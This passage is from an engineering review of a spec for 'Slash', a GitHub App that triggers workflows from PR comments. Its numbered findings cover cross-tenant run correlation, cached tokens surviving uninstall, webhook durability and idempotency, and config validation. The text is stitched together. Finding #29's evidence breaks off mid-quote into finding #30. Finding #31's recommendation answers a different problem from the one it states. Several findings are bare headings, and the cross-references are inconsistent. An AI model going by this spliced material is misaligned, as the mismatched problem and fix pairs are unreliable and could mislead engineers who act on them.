**Evidence**: Spec §6.3.2: "match `workflow_run` events by (repo, workflow file, `event=workflow_dispatch`, head branch, `created_at` ≥ dispatch time − skew), claiming the earliest unclaimed run per invocation, oldest invocation first." Spec §7.2 lists `installation_id, owner, repo` as tenancy columns and `workflow_run_id` as "nullable until correlated", with no stated unique index; "Webhook processing must be **idempotent** ... keying on delivery GUID or natural keys, upserts over inserts." Spec §6.3's own "Known limitation" acknowledges cross-correlation only *within* a repo ("concurrent identical dispatches on the same branch may cross-correlate under strategy 2"), showing the cross-tenant case was not considered.

**Recommendation**: (1) Restate the §6.3.2 predicate to include `installation_id` and `owner` explicitly, and make every correlation and check-run query take a tenant-scoped repository key (`repository_id` from the webhook payload is the strongest choice — immutable across renames — so store it). (2) Add DB constraints that make the bug unrepresentable: `UNIQUE (installation_id, repository_id, workflow_run_id)` and a partial index for unclaimed invocations; do the claim as a single conditional `UPDATE ... WHERE workflow_run_id IS NULL RETURNING` inside the transaction. (3) Add an integration test with two installations owning same-named repos and interleaved dispatches, asserting no cross-claim. (4) Define a retention policy for `invocations` (e.g. 30–90 days), store a sanitized/truncated `raw_comment_line` per finding #11, and document what Slash retains and for how long — this is also a prerequisite for any tenant's data-processing review.

#### 27. [LOW] Cached installation tokens and queued work survive uninstall, suspension, and repository removal

**Problem**: §7.1 caches installation tokens "until expiry" (up to one hour) and §7.3 subscribes to `installation` and `installation_repositories` without stating what those handlers do. A tenant's incident response for "revoke this integration" is to suspend or uninstall the App — but nothing in the spec invalidates the cached token, drains the in-process queue of that installation's pending invocations, or cancels the up-to-10-minute polling loops from §6.3.3. Slash therefore keeps commenting, creating check runs, and (most importantly) dispatching workflows for a tenant that has just revoked it, for as long as queued work and the token TTL allow. The same applies when a single repository is removed from the installation. This is precisely the window in which a tenant is trying to stop an ongoing compromise.

**Evidence**: Spec §7.1: "App auth: JWT → installation tokens, cached until expiry". Spec §7.3 lists `installation` and `installation_repositories` among subscribed events but §5's flow and §8's edge-case list contain no handling for suspend/uninstall/repo-removal, and §8's must-handle list does not include them. GitHub installation tokens "expire one hour from the time you create them" (https://docs.github.com/en/rest/apps/apps), bounding the exposure window at one hour plus queue drain time.

**Recommendation**: (1) Specify handlers: on `installation` with action `suspend`/`deleted` and on `installation_repositories` `removed`, immediately evict all cached tokens for that installation (or repo), mark affected pending invocations as aborted, and drop their queued work and pollers. (2) Call `DELETE /installation/token` to actively revoke the cached token rather than waiting out the TTL. (3) Gate every mutating GitHub call on a fast "is this installation/repo still active?" check so in-flight work stops at the next step boundary rather than running to completion. (4) Add these to §8's must-handle list and cover them in the M5/M6 integration tests, and document the revocation behavior and expected stop-time in the user docs so tenants know what "uninstall" guarantees.

### C. Distributed-systems and operations (ops-correctness)

#### 28. [HIGH] In-process queue after 200 silently loses invocations; GitHub never auto-redelivers **[independently re-checked]**

*spec section*: 7.3 (plan M4)

**Problem**: Spec 7.3 says 'enqueue in-process, return 200 fast' and M4 builds a 'tokio task queue'. Any crash, OOM-kill, or non-graceful deploy between the 200 and pipeline completion silently loses the invocation: GitHub never automatically redelivers webhook deliveries (not after 2xx, and not even on failure — redelivery is manual or via the REST deliveries API, and a 200-acknowledged delivery is recorded as successful so nothing even shows as failed). The spec's idempotency rationale in §7.2/§8 ('GitHub redelivers') therefore rests on a false premise, and durability before the mid-pipeline DB insert is zero. Worst window: spec §5 creates the 'slash/<command>' check run (queued) BEFORE persisting the invocation, so a crash there leaves a check run stuck at queued that Slash will never update — blocking any PR that requires it via branch protection until a user notices and manually re-invokes the command (a retry creates a fresh same-named check run that supersedes the stuck one, so it is user-recoverable but never self-healing, with no failure signal). Post-persist crash windows are also unrecovered as specified, since §6.3's polling fallback is an in-memory timer keyed to dispatch time with no startup sweep of pending invocations.

**Evidence**: Spec 7.3: 'enqueue in-process, return 200 fast'; plan M4: 'parse event → enqueue in-process → 200 fast... tokio task queue'. GitHub docs ('Handling failed webhook deliveries'): GitHub does not automatically redeliver; apps are told to periodically call GET /app/hook/deliveries and redeliver themselves. Contrast lighthouse: the webhook handler synchronously persists a durable LighthouseJob CRD before responding, and returns 500 (surfacing a visible failed delivery) on error — D:/git/GitHub/HenryZhang-ZHY/slash_workspace/lighthouse/pkg/webhook/webhook.go:264 (ProcessWebHook called inline in the request path) and D:/git/GitHub/HenryZhang-ZHY/slash_workspace/lighthouse/pkg/launcher/launcher.go:29-43 (Launch = etcd Create before anything else). Prow's hook also fires goroutines after 200 (D:/git/GitHub/HenryZhang-ZHY/slash_workspace/prow/pkg/hook/server.go:70-112), but its loss window is only 'until ProwJob CRD created'; everything after that is reconciled from durable state by plank and crier (D:/git/GitHub/HenryZhang-ZHY/slash_workspace/prow/pkg/plank/reconciler.go, D:/git/GitHub/HenryZhang-ZHY/slash_workspace/prow/pkg/crier/controller.go). Slash's entire side-effect pipeline (config load, permission check, reaction, check-run create, DB insert, dispatch) sits in the volatile window.

**Recommendation**: Adopt a transactional inbox: inside the request handler, INSERT the raw delivery (keyed by X-GitHub-Delivery GUID, unique constraint) into a Postgres events table, then return 200. Workers consume via SELECT ... FOR UPDATE SKIP LOCKED and mark done only after the pipeline's side effects complete (with per-step progress recorded so reprocessing resumes idempotently). Add a startup/periodic sweep of GET /app/hook/deliveries to detect and self-redeliver gaps. This makes Postgres the durable queue — the moral equivalent of prow's ProwJob CRD — and update spec 7.3/M4 accordingly.

#### 29. [HIGH] Idempotency is unimplementable with the declared schema: no comment_id or delivery GUID column **[independently re-checked]**

*spec section*: 7.2 (plan M4)

**Problem**: Spec §7.2 demands idempotent webhook processing 'keying on delivery GUID or natural keys', and M4 says 'idempotent upsert keyed to handle GitHub redelivery' — but the invocations table has neither a comment_id nor a delivery-GUID column, and the primary key is a random UUIDv4 (§4.2: 'generated per invocation') minted per processing attempt. There is no unique key to upsert against: a redelivered issue_comment produces a fresh UUID, a second check run, and a second workflow_dispatch — i.e., a double deploy. (The 🚀 reaction is the one side effect GitHub itself dedupes: the reactions API returns 200 'Reaction exists' for a repeat, so no visible duplicate there.) This failure mode is structural, not hypothetical: GitHub does not auto-redeliver, so the only recovery from lost in-process queue events (finding #1) is manual redelivery — which re-delivers already-processed events under the same X-GitHub-Delivery GUID, exactly the case the missing GUID/comment_id columns were supposed to catch.

**Evidence**: Spec 7.2 table columns: id, installation_id, owner, repo, pr_number, head_sha, head_branch, command, raw_comment_line, args, check_run_id, workflow_file, dispatched_at, workflow_run_id, status — no comment_id, no delivery_guid. Spec 7.2 text: 'keying on delivery GUID or natural keys, upserts over inserts' names keys the schema does not contain. Prow explicitly solves the same class of bug with deterministic identity: D:/git/GitHub/HenryZhang-ZHY/slash_workspace/prow/pkg/plugins/trigger/trigger.go:379 — 'createWithRetry ... #### 30. [HIGH] 60s/10min polling-fallback timers are in-process state; 'horizontal scale-out safe' is false as written

*spec section*: 6.3 strategy 3, 7.1 (plan M6)

**Problem**: Spec 6.3 strategy 3 requires action '60s after dispatch' and a 10-minute deadline, but the spec never says who owns these timers. The only possible reading of the M4/M6 design (in-process tokio queue, no scheduler component, no lease table) is per-invocation tokio timers on whichever replica did the dispatch. **Evidence**: Spec 6.3: 'if no workflow_run webhook correlates within 60s of dispatch, poll ... If nothing is found within 10 minutes, mark the check run completed/failure'. Spec 7.1: 'single stateless container ... Horizontal scale-out safe'. M6: 'polling fallback with the 60s/10min timeouts' with no coordination mechanism named. **Recommendation**: Slash needs a reconcile loop, not timers: every replica runs a periodic sweeper over durable state — SELECT ... FROM invocations WHERE status='dispatched' AND dispatched_at < now()-interval '60 seconds' FOR UPDATE SKIP LOCKED — performing the poll-correlate-or-expire logic; SKIP LOCKED gives free multi-replica coordination without leader election. #### 31. [HIGH] Correlation state machine has no monotonicity guard against out-of-order/duplicate workflow_run events

*spec section*: 6.3, 5, 7.2 (plan M6)

**Problem**: GitHub gives no webhook ordering guarantee, and deliveries can also be duplicated or manually redelivered. **Evidence**: Spec 5 flow block: 'workflow_run(requested|in_progress|completed) webhook → correlate → update check run: in_progress → status=in_progress...' — a direct event-to-mutation mapping with no state guard. **Recommendation**: For 0.0.1, pick one deliberately: (a) subscribe to check_run and implement rerequested as 'create new invocation from the stored row, re-run permission gate on payload sender, dispatch' — it is a small delta over M5/M6 and delivers the /retest-shaped feature for free; or (b) subscribe and reply with a comment explaining re-run isn't supported yet ('re-comment the command'). Shipping neither means an unexplained dead button. Record `requested_action` buttons (Re-run/Cancel) as the designed 0.0.2 path so the state machine (one check run name, multiple invocations) is not painted into a corner.

#### 45. [MEDIUM] Section 10 success criteria are observable but not measurable, and cover only strategy-1 happy path on a single tenant

#### 47. [MEDIUM] Fork-PR exclusion is the correct 0.0.1 cut, but the spec neither states the market consequence nor specs the comment, and the comment path spams

**Evidence**: Spec 2.4: 'Fork PRs (workflow_dispatch cannot target a fork ref). Commands on fork PRs get a polite explanatory comment and no dispatch.' Spec 6.4 mandates comment+😕 for every user-correctable failure with no dedupe rule. #### 48. [MEDIUM] One-command-per-file is fine at 10+ commands, but config errors surfacing only at invocation time is the real ergonomics gap

*spec section*: 4

**Problem**: The file-per-command layout itself scales acceptably (small files, per-command CODEOWNERS, no merge conflicts; prow's plugins.yaml monolith is the worse extreme), though it forbids shared defaults (e.g. a repo-wide permission floor) and 10+ near-identical 10-line files invite copy-paste drift. The sharper problem is spec 4's own words: 'Duplicate command names across files are a configuration error (reported when a command is invoked)'. All config validation — duplicates, unknown keys, bad permission enums, >10 inputs — is deferred to the moment a user runs a command, so the person who broke the config on the default branch is not the person who gets the error, possibly days later. Prow solved exactly this with checkconfig run as a presubmit.

**Evidence**: Spec 4: 'Duplicate command names across files are a configuration error (reported when a command is invoked).' Spec 4.1 validation rules all lack a validate-on-push trigger; spec 7.3 does subscribe to push-adjacent events only for 'head SHA freshness'. Prow ships cmd/checkconfig (D:/git/GitHub/HenryZhang-ZHY/slash_workspace/prow/cmd/checkconfig) precisely so config errors surface in the config PR, not at command time.

**Recommendation**: Cheap 0.0.1-compatible fix: on push to the default branch touching .slash/ (the app already has contents:read; add push to the webhook events), validate the directory and create a check run or commit status 'slash/config' on that commit reporting all errors. Even cheaper: ship the slash-config crate's validator as a tiny CLI (cargo install / docker run) users can wire into their own CI, and document it in M7. #### 50. [LOW] One-command-per-comment and command aliases are correctly deferred, but the divergence from prow needs explicit documentation

*spec section*: 3, 2.4
